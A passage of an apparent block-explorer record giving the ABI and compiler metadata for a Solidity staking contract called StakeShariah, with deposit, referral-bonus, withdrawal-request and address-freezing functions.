,\"type\":\"function\"},{\"inputs\":[],\"name\":\"claim\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"compound\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"developerAddress\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"freezeAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"freezedAddresses\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getAllrequests\",\"outputs\":[{\"components\":[{\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"approved\",\"type\":\"bool\"}],\"internalType\":\"struct StakeShariah.CapitalWithdrawalRequest[]\",\"name\":\"\",\"type\":\"tuple[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBASEPERCENT\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getContractBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getTx\",\"outputs\":[{\"components\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"withdrawn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"start\",\"type\":\"uint256\"}],\"internalType\":\"struct StakeShariah.Deposit[]\",\"name\":\"\",\"type\":\"tuple[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"add\",\"type\":\"address\"}],\"name\":\"getUplinePartner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"add\",\"type\":\"address\"}],\"name\":\"getUser\",\"outputs\":[{\"components\":[{\"components\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"withdrawn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"start\",\"type\":\"uint256\"}],\"internalType\":\"struct StakeShariah.Deposit[]\",\"name\":\"deposits\",\"type\":\"tuple[]\"},{\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"bonus\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"checkpoint\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalEarned\",\"type\":\"uint256\"},{\"internalType\":\"uint24[3]\",\"name\":\"refs\",\"type\":\"uint24[3]\"},{\"internalType\":\"uint256\",\"name\":\"totalBonus\",\"type\":\"uint256\"}],\"internalType\":\"struct StakeShariah.User\",\"name\":\"user\",\"type\":\"tuple\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserAmountOfDeposits\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserAvailable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserPercentRate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserReferralBonus\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserReferralTotalBonus\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserReferralsStats\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"currentbonus\",\"type\":\"uint256\"},{\"internalType\":\"uint24[3]\",\"name\":\"refs\",\"type\":\"uint24[3]\"},{\"internalType\":\"uint256\",\"name\":\"totalbonus\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserReferrer\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserStatus\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"userAvailable\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalDeposit\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalWithdraw\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserTotalDeposits\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserTotalEarned\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserTotalWithdrawn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserdividends\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getWithdrawalRequests\",\"outputs\":[{\"components\":[{\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"approved\",\"type\":\"bool\"}],\"internalType\":\"struct StakeShariah.CapitalWithdrawalRequest[]\",\"name\":\"\",\"type\":\"tuple[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"isActive\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"val\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isFreezed\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"val\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"}],\"name\":\"leaderinvest\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maintenanceAddress\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAddress\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"projectAddress\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"requestId\",\"type\":\"uint256\"}],\"name\":\"rejectCapitalWithdrawal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"}],\"name\":\"stake\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalDeposits\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalInvested\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalUsers\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalWithdrawn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"unfreezeAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"unstake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newBasePercent\",\"type\":\"uint256\"}],\"name\":\"updateBasePercent\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"users\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"bonus\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"checkpoint\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalEarned\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalBonus\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "StakeShariah", "CompilerVersion": "v0.8.10+commit.fc410830", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000a42d5b7228639719157d6cc028df691cbce5a5630000000000000000000000001f88aa642a5f79f9695d318a3fda0dbbf5730ab1000000000000000000000000214016842eacdd051d909365d94397c17ad4a0e00000000000000000000000004b6687d5331f445345176ffa4ca7519b401152b1", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://550e3e3557e751391f643228e5193eba55c1fb7f03f0c3234466b01d4d356531"}